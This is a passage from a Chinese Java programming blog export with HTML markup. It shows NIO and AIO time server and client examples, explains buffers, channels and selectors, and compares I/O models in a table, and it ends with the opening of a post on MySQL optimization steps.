class=\"keyword\">else</span> <span class=\"keyword\">if</span> (readBytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"comment\">//链路关闭</span></span><br><span class=\"line\">                        sc.close();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doConnect</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//连接成功注册到多路复用器上发送请求消息，等待读取</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (socketChannel.connect(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(host, port))) &#123;</span><br><span class=\"line\">            socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class=\"line\">            doWrite(socketChannel);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//否则注册连接到等待连接，可能TCP没有握手应答消息</span></span><br><span class=\"line\">            socketChannel.register(selector, SelectionKey.OP_CONNECT);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doWrite</span><span class=\"params\">(SocketChannel sc)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"string\">&quot;query time&quot;</span>.getBytes();</span><br><span class=\"line\">        <span class=\"type\">ByteBuffer</span> <span class=\"variable\">writeBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(bytes.length);</span><br><span class=\"line\">        writeBuffer.put(bytes);</span><br><span class=\"line\">        writeBuffer.flip();</span><br><span class=\"line\">        sc.write(writeBuffer);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!writeBuffer.hasRemaining()) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Send Success&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">TimeClientHandle</span>(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">8888</span>), <span class=\"string\">&quot;TimeClient&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>分别启动客户端和服务端后就可以看到输出信息了。</p>\n<p><strong>Buffer：</strong><br>在上述使用NIO的时候涉及到缓冲区Buffer，数据读取和写入都是通过缓冲区。缓冲区实际上是一个数组，上述使用的事ByteBuffer，可以使用其他类型数组（基本上Java基本类型都有对应的缓冲区，除了Boolean），不过缓冲区不仅仅是数组，还提供了对数据结构化访问以及维护读写位置等信息。</p>\n<p><strong>Channel：</strong><br>除了使用缓冲区还要使用到Channel，网络中数据通过Channel读取和写入，Channel可以用于读写以及同时存在。Channel在使用过程中，可以分为两大类：SelectableChannel（网络读写）、FileChannel（文件操作）。</p>\n<p>Channel子类关系图如下：<br><img src=\"/images/old/20180131%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-01-31%E4%B8%8B%E5%8D%885.02.38.png\"></p>\n<p><strong>Selector：</strong><br>Selector在NIO中属于核心部分，在使用过程中通过轮询注册在Selector上的Channel，因为JDK中使用了<code>epoll</code>所以没有最大连接句柄的现在。所以只需要一个线程负责Selector轮询就能接入大量的客户端。</p>\n<h3 id=\"AIO\"><a href=\"#AIO\" class=\"headerlink\" title=\"AIO\"></a>AIO</h3><p>在JavaNIO2.0中使用的是之前对应的AIO，不需要使用多路复用器对注册的通道进行轮询，即可实现异步读写。<br>例子：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">8888</span>;</span><br><span class=\"line\">        <span class=\"type\">AsyncTimeServerHandler</span> <span class=\"variable\">asyncTimeServerHandler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">AsyncTimeServerHandler</span>(port);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(asyncTimeServerHandler, <span class=\"string\">&quot;AIO-TimeServer&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * AsyncTimeServerHandler</span></span><br><span class=\"line\"><span class=\"comment\"> * 异步服务</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/2/1.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AsyncTimeServerHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> port;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> AsynchronousServerSocketChannel serverSocketChannel;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> CountDownLatch latch;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AsyncTimeServerHandler</span><span class=\"params\">(<span class=\"type\">int</span> port)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.port = port;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//开启异步serverSocketChannel</span></span><br><span class=\"line\">            serverSocketChannel = AsynchronousServerSocketChannel.open();</span><br><span class=\"line\">            <span class=\"comment\">//绑定端口</span></span><br><span class=\"line\">            serverSocketChannel.bind(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(port));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Server Start ...&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        latch = <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        doAccept();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//阻塞线程，避免服务端结束，在实际使用中，不需要新驱动线程以及阻塞</span></span><br><span class=\"line\">            latch.await();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doAccept</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//使用AcceptCompletionHandler接收accept操作成功的通知消息</span></span><br><span class=\"line\">        serverSocketChannel.accept(<span class=\"built_in\">this</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">AcceptCompletionHandler</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> AsynchronousServerSocketChannel <span class=\"title function_\">getServerSocketChannel</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> serverSocketChannel;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> CountDownLatch <span class=\"title function_\">getLatch</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> latch;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * AcceptCompletionHandler</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收完成处理</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/2/1.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AcceptCompletionHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">CompletionHandler</span>&lt;AsynchronousSocketChannel, AsyncTimeServerHandler&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(AsynchronousSocketChannel result, AsyncTimeServerHandler attachment)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//这里的作用是，接收客户端成功后，用于接收其他客户端连接，每次接收一个客户端成功后，在异步接收新客户端</span></span><br><span class=\"line\">        <span class=\"comment\">//接收成功后，会回调AcceptCompletionHandler.completed</span></span><br><span class=\"line\">        attachment.getServerSocketChannel().accept(attachment, <span class=\"built_in\">this</span>);</span><br><span class=\"line\">        <span class=\"comment\">//链路建立成功后，服务端分配缓冲区接收客户端数据</span></span><br><span class=\"line\">        <span class=\"type\">ByteBuffer</span> <span class=\"variable\">buffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(<span class=\"number\">1024</span>);</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * 参数：</span></span><br><span class=\"line\"><span class=\"comment\">         * 1 接收缓冲区，用于异步Channel中读取数据包</span></span><br><span class=\"line\"><span class=\"comment\">         * 2 异步Channel携带的附件，通知回调的时候，作为入参数使用</span></span><br><span class=\"line\"><span class=\"comment\">         * 3 接收通知回调业务Handler</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        result.read(buffer, buffer, <span class=\"keyword\">new</span> <span class=\"title class_\">ReadCompletionHandler</span>(result));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, AsyncTimeServerHandler attachment)</span> &#123;</span><br><span class=\"line\">        exc.printStackTrace();</span><br><span class=\"line\">        attachment.getLatch().countDown();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * ReadCompletionHandler</span></span><br><span class=\"line\"><span class=\"comment\"> * 接收通知回调</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/2/1.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ReadCompletionHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">CompletionHandler</span>&lt;Integer, ByteBuffer&gt; &#123;</span><br><span class=\"line\">    <span class=\"comment\">//用于半包消息和发送应答</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> AsynchronousSocketChannel socketChannel;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ReadCompletionHandler</span><span class=\"params\">(AsynchronousSocketChannel socketChannel)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.socketChannel = socketChannel;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">format</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//读取缓冲区数据做准备</span></span><br><span class=\"line\">        attachment.flip();</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[attachment.remaining()];</span><br><span class=\"line\">        attachment.get(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(bytes, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;client request is: %s\\n&quot;</span>, request);</span><br><span class=\"line\">            <span class=\"comment\">//写消息返回客户端</span></span><br><span class=\"line\">            doWrite(<span class=\"string\">&quot;QUERY TIME&quot;</span>.equalsIgnoreCase(request) ? format.format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()) : <span class=\"string\">&quot;ERROR&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doWrite</span><span class=\"params\">(String body)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (body != <span class=\"literal\">null</span> &amp;&amp; body.trim().length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = body.getBytes();</span><br><span class=\"line\">            <span class=\"type\">ByteBuffer</span> <span class=\"variable\">writeBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(bytes.length);</span><br><span class=\"line\">            writeBuffer.put(bytes);</span><br><span class=\"line\">            writeBuffer.flip();</span><br><span class=\"line\">            <span class=\"comment\">//写消息到客户端，参数和read一样，后面handler用于发送消息后回调接口</span></span><br><span class=\"line\">            socketChannel.write(writeBuffer, writeBuffer, <span class=\"keyword\">new</span> <span class=\"title class_\">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class=\"line\">                <span class=\"meta\">@Override</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//没发送完毕</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (attachment.hasRemaining()) &#123;</span><br><span class=\"line\">                        socketChannel.write(attachment, attachment, <span class=\"built_in\">this</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"meta\">@Override</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        socketChannel.close();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                        e.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            socketChannel.close();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">AsyncTimeClientHandler</span>(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">8888</span>)).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * AsyncTimeClientHandler</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by  on 2018/2/1.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AsyncTimeClientHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">CompletionHandler</span>&lt;Void, AsyncTimeClientHandler&gt;, Runnable &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String host;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> port;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> AsynchronousSocketChannel socketChannel;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> CountDownLatch latch;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AsyncTimeClientHandler</span><span class=\"params\">(String host, <span class=\"type\">int</span> port)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.host = host;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.port = port;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            socketChannel = AsynchronousSocketChannel.open();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        latch = <span class=\"keyword\">new</span> <span class=\"title class_\">CountDownLatch</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        socketChannel.connect(<span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(host, port), <span class=\"built_in\">this</span>, <span class=\"built_in\">this</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            latch.await();</span><br><span class=\"line\">            socketChannel.close();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(Void result, AsyncTimeClientHandler attachment)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] request = <span class=\"string\">&quot;query time&quot;</span>.getBytes();</span><br><span class=\"line\">        <span class=\"type\">ByteBuffer</span> <span class=\"variable\">writeBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(request.length);</span><br><span class=\"line\">        writeBuffer.put(request);</span><br><span class=\"line\">        writeBuffer.flip();</span><br><span class=\"line\">        <span class=\"comment\">//准备完毕后发送消息到客户端</span></span><br><span class=\"line\">        socketChannel.write(writeBuffer, writeBuffer, <span class=\"keyword\">new</span> <span class=\"title class_\">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (attachment.hasRemaining())&#123;</span><br><span class=\"line\">                    <span class=\"comment\">//没写完重写</span></span><br><span class=\"line\">                    socketChannel.write(attachment, attachment, <span class=\"built_in\">this</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//写完准备读取客户端返回数据</span></span><br><span class=\"line\">                    <span class=\"type\">ByteBuffer</span> <span class=\"variable\">readBuffer</span> <span class=\"operator\">=</span> ByteBuffer.allocate(<span class=\"number\">1024</span>);</span><br><span class=\"line\">                    socketChannel.read(readBuffer, readBuffer, <span class=\"keyword\">new</span> <span class=\"title class_\">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class=\"line\">                        <span class=\"meta\">@Override</span></span><br><span class=\"line\">                        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">completed</span><span class=\"params\">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                            attachment.flip();</span><br><span class=\"line\">                            <span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[attachment.remaining()];</span><br><span class=\"line\">                            attachment.get(bytes);</span><br><span class=\"line\">                            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                <span class=\"type\">String</span> <span class=\"variable\">body</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(bytes, <span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">                                System.out.printf(<span class=\"string\">&quot;now is : %s \\n&quot;</span>, body);</span><br><span class=\"line\">                                latch.countDown();</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class=\"line\">                                e.printStackTrace();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"meta\">@Override</span></span><br><span class=\"line\">                        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                socketChannel.close();</span><br><span class=\"line\">                                latch.countDown();</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                                e.printStackTrace();</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    socketChannel.close();</span><br><span class=\"line\">                    latch.countDown();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">failed</span><span class=\"params\">(Throwable exc, AsyncTimeClientHandler attachment)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            socketChannel.close();</span><br><span class=\"line\">            latch.countDown();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>几种I&#x2F;O模型功能特性对比：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">同步阻塞I&#x2F;O(BIO)</th>\n<th align=\"left\">伪异步I&#x2F;O</th>\n<th align=\"left\">非阻塞I&#x2F;O(NIO)</th>\n<th align=\"left\">异步I&#x2F;O(AIO)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>客户端&#x2F;服务端：I&#x2F;O线程</td>\n<td align=\"left\">1:1</td>\n<td align=\"left\">M:N(M可以大于N)</td>\n<td align=\"left\">M:1(1个服务端处理多个客户端)</td>\n<td align=\"left\">M:0(不需要启动额外的I&#x2F;O线程，OS回调)</td>\n</tr>\n<tr>\n<td>阻塞类型</td>\n<td align=\"left\">阻塞I&#x2F;O</td>\n<td align=\"left\">阻塞I&#x2F;O</td>\n<td align=\"left\">非阻塞I&#x2F;O</td>\n<td align=\"left\">非阻塞I&#x2F;O</td>\n</tr>\n<tr>\n<td>同步类型</td>\n<td align=\"left\">同步</td>\n<td align=\"left\">同步</td>\n<td align=\"left\">同步(多路复用)</td>\n<td align=\"left\">异步</td>\n</tr>\n<tr>\n<td>API使用难度</td>\n<td align=\"left\">简单</td>\n<td align=\"left\">简单</td>\n<td align=\"left\">非常复杂</td>\n<td align=\"left\">复杂</td>\n</tr>\n<tr>\n<td>调试难度</td>\n<td align=\"left\">简单</td>\n<td align=\"left\">简单</td>\n<td align=\"left\">复杂</td>\n<td align=\"left\">复杂</td>\n</tr>\n<tr>\n<td>可靠性</td>\n<td align=\"left\">非常差</td>\n<td align=\"left\">差</td>\n<td align=\"left\">高</td>\n<td align=\"left\">高</td>\n</tr>\n<tr>\n<td>吞吐量</td>\n<td align=\"left\">低</td>\n<td align=\"left\">中</td>\n<td align=\"left\">高</td>\n<td align=\"left\">高</td>\n</tr>\n</tbody></table>\n<p>在网络上据说Linux下AIO对性能提升并不高。所以Netty依旧使用封装的NIO，可查看</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ldHR5L25ldHR5L2lzc3Vlcy8yNTE1\">https://github.com/netty/netty/issues/2515<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>参考：</p>\n<ul>\n<li>netty权威指南</li>\n</ul>\n","categories":["Java基础","NIO","Netty"],"tags":["基础","NIO","Netty","AIO","BIO","IO"]},{"title":"Mysql优化思路","url":"/2018/03/19/Mysql%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF/","content":"<p>在业务增长过程中，数据库中的数据量是越来越大，之前在国美时，公司都是用的oracle能承受的数据量比较大，那时候没感觉到数据库是瓶颈，基本上都是由dba直接做了数据库层的优化，基本上我们使用不需要做修改特别的优化，一般情况下都是优化sql，后期可能因为oracle太贵，部分数据存入mongodb和mysql中，在之后因为已经离职还未见到需要对mysql进行特别的优化。</p>\n<p>在现在公司中，特别倾向于对mysql进行分库分表，其实有时候并不一定需要，比如把大量的数据存入mysql中用于查询，这种情况不应该通过ELK来做日志采集和查询吗。</p>\n<p>在数据增长过程中，并不是直接就进行分库分表，可以分步骤进行。</p>\n<blockquote>\n<ol>\n<li>sql优化、索引</li>\n<li>热点数据缓存、redis、memcached</li>\n<li>读写分离</li>\n<li>垂直切分</li>\n<li>分区</li>\n<li>分库、分表</li>\n</ol>\n</blockquote>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzE5NzE5OTk3L2Fuc3dlci84MTkzMDMzMg==\">MySQL 对于千万级的大表要怎么优化？ - zhuqz的回答 - 知乎<i class=\"fa fa-external-link-alt\"></i></span></p>\n<span id=\"more\"></span>\n\n<h3 